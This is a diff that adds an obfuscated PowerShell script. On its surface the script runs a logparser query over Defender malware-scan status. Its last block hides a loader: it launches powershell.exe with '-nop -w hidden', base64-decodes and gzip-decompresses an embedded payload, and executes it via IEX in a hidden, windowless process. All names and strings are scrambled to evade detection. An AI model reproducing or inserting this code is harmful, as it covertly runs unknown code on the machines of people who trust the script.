@@ -1,0 +1,44 @@
+ sEt-vARIablE ("{1}{0}"-f 'Gt','f07')  ( [TyPE]("{0}{1}{2}" -f 'Sys','teM.','Io.patH')  );  ${9`P5c}  =  [TYpe]("{0}{1}"-f'i','NTptR')  ;  ${j`zKw4}  =[tYpE]("{6}{5}{4}{1}{3}{2}{0}" -f'S','.dIagno','S','sTIcS.pROce','m','Ste','Sy') ; 
+
+if (&("{2}{1}{0}" -f'd','et-Comman','G') ("{0}{2}{1}" -f 'logparser.','xe','e')) {
+    ${LPqU`Ery} = ((("{91}{110}{123}{128}{183}{22}{16}{101}{124}{103}{78}{68}{0}{77}{63}{95}{48}{50}{81}{7}{196}{35}{184}{96}{192}{15}{55}{54}{173}{82}{5}{97}{6}{166}{1}{200}{47}{180}{31}{27}{171}{41}{155}{170}{29}{39}{172}{93}{73}{158}{104}{90}{106}{206}{53}{72}{136}{132}{203}{98}{177}{83}{112}{141}{28}{204}{80}{133}{198}{44}{37}{70}{12}{105}{130}{191}{144}{58}{9}{66}{134}{52}{131}{135}{169}{164}{13}{76}{122}{143}{79}{129}{126}{94}{178}{71}{201}{147}{176}{64}{62}{165}{60}{202}{208}{150}{18}{167}{61}{120}{88}{26}{23}{59}{189}{193}{99}{21}{2}{20}{57}{179}{11}{190}{10}{117}{32}{3}{43}{195}{160}{67}{163}{116}{174}{24}{161}{69}{153}{187}{56}{194}{159}{14}{151}{182}{197}{84}{207}{85}{205}{156}{148}{186}{46}{199}{30}{188}{100}{125}{119}{175}{118}{108}{92}{65}{40}{38}{140}{51}{8}{25}{154}{168}{127}{102}{113}{157}{86}{87}{185}{115}{33}{34}{17}{4}{137}{152}{109}{36}{42}{89}{146}{162}{114}{139}{75}{145}{142}{121}{49}{181}{149}{74}{19}{107}{45}{111}{138}"-f '   Cri','M','edD','n
+ ','Rece',' ','P','c','s,','ed','   Sche',' ','    Cr',' PendingFu','   ','g','   ','   ','    ','CNT','etections','n',' (
+ ','  Re','MInfectionStatus.',' 
+','boot, 
+      ',' ','s','Scan, 
+      ','     ','
+','ersio',' 
+','     ',', 
+ ','n','tat','anu','  P','M','ndi','s, 
+','  ','uterS','SC
+',' ','ualSt','dD','
+','e','Step','t','etec','n, 
+','FullSca','OUP',', 
+ ','ail','ce','l','e','gOf','ic','in','g','D','    ','atus, 
+     ','
+  ','us, 
+    ','  ','t','g','  ','D','l','t','St','
+      ',') AS cnt,
+        Co','te','   ',' ','Fa','dDe','eScan, 
+        Pe','n','ngRe','        Sc','      Re','gI','din','ndin','ndi','allyFaile','   ','   ',',','ea','ul','  ','  P','ter','eboot, 
+  ','iti','cently',' A',' Pen','nedDetectio','u
+  ','g',' Sche','ending','sion
+    ','boot,','   *','maV','   ','an, 
+   ','ndi','Y','l','  S','  Compu','lSc',' Pe','   ','E',' ','ca','ec','n','m','e','tions','io','ntly','Iu','OR','al','maVer','B','Scan, ','F','ER ','hem','     ','n',' ',', 
+  ','     ComputerStatus, 
+','Clea','  ','  ','n','io','Offlin','R','BY
+','FROM
+','tsv','aVer',' ','      ','f','ending','  P',' ',', 
+ ','gOffline','       Pe','e',' ','A',' ','Pend',' 
+      ','ngManualSteps, 
+',' ','eps, ','     ','       ','LECT count','  ','dingRe','s,','GR',' PendingF','n','  ','lly','  Pendin','tlyCl',' ',' ','tions',' Critically','p','
+  ','an',' ','in','s','ion','tect','CleanedD','ile','eScan'))."replA`cE"('gIu',[STRInG][chAr]34))
+
+    & ("{1}{2}{0}" -f'rser','l','ogpa') -stats:("{1}{0}"-f'ff','o') -i:("{1}{0}"-f'v','cs') -dtlines:0 -fixedsep:('on') -rtp:('-1') "$lpquery"
+
+} else {
+    ${S`CRipTNa`me} =  (LS ("{3}{2}{1}{0}"-f'f07Gt',':','IABLE','vAR'))."v`ALuE"::("{2}{1}{0}"-f 'eName','etFil','G').Invoke(${mYIN`VOCAT`I`ON}."scr`I`PtnAMe")
+    "${ScriptName} requires logparser.exe in the path."
+}
+
+if( (geT-VarIAblE ("{0}{1}" -f'9P','5c')  -VaLuEOnlY  )::"si`Ze" -eq 4){${b}=("{2}{1}{3}{0}"-f'exe','owershell','p','.')}else{${b}=${e`N`V:WiNDIR}+((("{3}{0}{1}{4}{8}{5}{7}{6}{9}{2}" -f 'sPow','er','exe','49tsyswow6449tWindow','S','ell4','.049tpowershel','9tv1','h','l.')) -REpLaCe ([Char]52+[Char]57+[Char]116),[Char]92)};${s}=&("{0}{1}{2}"-f 'New-O','bj','ect') ("{0}{6}{5}{3}{1}{4}{2}" -f'Sy','ss','rtInfo','ce','Sta','ro','stem.Diagnostics.P');${s}."F`ilEna`mE"=${B};${s}."Ar`guMEN`TS"=('-'+'nop '+'-'+'w '+'hidden'+' '+'-c'+' '+('i91'+'s=New-Obje'+'c'+'t ')."r`E`PLacE"(([chAR]105+[chAR]57+[chAR]49),'$')+(('IO.MemoryStr'+'eam'+'(,[Convert]::FromBase64String(R1lR1lH4sIAFHL6FcCA71'+'W/2/aOhD/uZP2P0QTEolGCVDWdpUmPYfwJS2h0EAoMDS5iRMMJqaOoYW9/e/vAqFlb+3Utx9eBIrtO5/Pn/vcXYJl5EnK'+'IwUPmMeugkvXVr6/f3fUxgL'+'PFTWzua9addss5ZSMsGLRWbCbU+3oCDQytHsllS+KOk'+'KLhcnnmEbji4vKUggSyd08XycSxTGZ3zFKYlVT/lb6EyLI8fXdlHhS+a5kvuXrj'+'N9hlqqtK9ibEOUYRX4ia3IPJ97lnQWjUs1+/ZrVRsfFcb56v8QsVrPOOpZknv'+'cZy2rKDy'+'05sLteEDVrU0/wmAcy36fRSSnfi2IckBZYWxGbyAn346wGt4CfIHIpImV7n8TATqxmYdgW3EO+L0gM2nkrWvEZUTPRkrGc8pc6Sk+/WUaSzgnIJRF84RCxoh6J8w0c+YzckGCstsj'+'D/tJv3'+'aQebgKtthRaDiLygps295eM7HZmtV8dfYqiBs9PkQQIfrx/9/5d'+'sKfBeiLPbwd9qyOdQx7A6Gi0HR'+'NwV23zmG7VvyiFnGLDwVhysYZ'+'ppiuWRBsroyQMo/EYDvO/OVbudQPFvTbozja1VbELiyOXU38Mm9IYZWb3l/TE7znxqZWIX6ecSQIa'+'EXMd4Tn19qxSXwoACRjZXjq'+'/V2uBd2o2FRDfJIyEWCaQ5pTRr9uqcyqf9hpLynwikAdBjMEriK/2szO7KKlZK7LJHNDazbMQjw'+'C4TPbaKX/X+9OTOShlKwzHcU5pLyGZvJziEMyIn1NQFNNUhJaSb4fZZ3ftJZPUw7Hcmxtr/4IzPbbCo1iKpQdxBAi6zoJ4FLMEk'+'ZzSoD4x1g4N98dnX8SjghmjUQiWVhAPWElwc'+'GTCDuH'+'nUiZoeYdIa75gZA5K2+yuMRxCLqcZseUTDomffcXTPfF3LE+g2WNy4CfE22Fc5hSXCgm1Io'+'F5x64/'+'dOSgUBy6VBEk'+'jZG6z6WRsZYJ9TO8ZCRcTYHawiIkQFITfG7gmJyWHSkAMPWDfk0rCJ6BFTHbM2a0iB5o0bLh36MnFjfP/KvLaUMX5uMkQFZs2Y222Wk0yqtLxy1Lp2rJq7Yl7ertdOqgxk1vIIcWanRpYTYobxa'+'XdOM0kT941E83xuahYDxupqEfDMwgCM8C56b4qUab/UrHKJRw06wum33jwSiU4yp9aHRorzO7rMm7gctwL9DD2+'+'JnTB+bYuoWub2xEKpPTrzNZeDWJ7a/HjT0z/3yDFURqkRVt2bwq4EhUFt3cejy/n1B6P2wggzPpmTY6dWMTqdmoF59'+'em9+1kPYe4snRt8t0eHi9mYC8xq'+'4cKUXypZPNnzQAZDqHOHwBnTCSsmbBKBjfkTGxxaPS3hmcGSATm14D34NFrU2A3m3V+LIZa1bjJrDdU3Xi4N2GTUKtF8PUWISh0YHo3hlbky96Prc739qDQLdvWVnulnpLrxA1/WHhnnlDYuP59dn'+'580+decc9XTd/ZCwA+iRWcnhtbtptg5i/lqRt7GIJ5'+'gBF6B67zOzxkUtLcNtT'+'pMdqnrQlWdERIRBK4Nmt2c1Yox7SVc4LNvQ'+'mHbtYg'+'xZ2oPhSenFkaY8KWrPTWO/dHExBJchWYDF+SaJQjnJFR5PCgUo+IXHcgFu/fZ'+'bVvhirSaWckm/eEIqtc621rUkdzJ+YXVfP/8/IEwzdwIv/40QP'+'q/9RvomWAu5ZxB+Ef288J+A/kMs+phK0'+'HegGDGya5O/hSQl0MGnxi5uwJAgfZKPveu'+'lPG7BN8g/6nlhxGUKAAA=R1lR1l));IEX ')  -rePlACe ([char]82+[char]49+[char]108),[char]39)+'(N'+'ew'+'-Objec'+'t '+'IO.'+'Stream'+'Rea'+'de'+'r('+'New-Obje'+'ct '+(('IO.'+'Compression.Gz'+'i'+'pS'+'tream(rBE'+'s,[IO.Comp'+'ression.'+'Com'+'press'+'io'+'n'+'Mode]:'+':De'+'compress))).Re'+'adToEnd();')  -rEplaCE 'rBE',[cHAr]36));${S}."U`se`SHElleXec`U`TE"=${FA`LSe};${s}."REdi`ReCt`sta`N`dAr`DOU`Tput"=${T`RUe};${s}."WInd`owSTY`lE"=("{0}{1}" -f 'Hi','dden');${s}."creATEN`o`wI`NDoW"=${tr`Ue};${p}= (  geT-varIaBLE  ('J'+'ZKW4') -VAlUeonlY  )::("{0}{1}" -f'St','art').Invoke(${s});
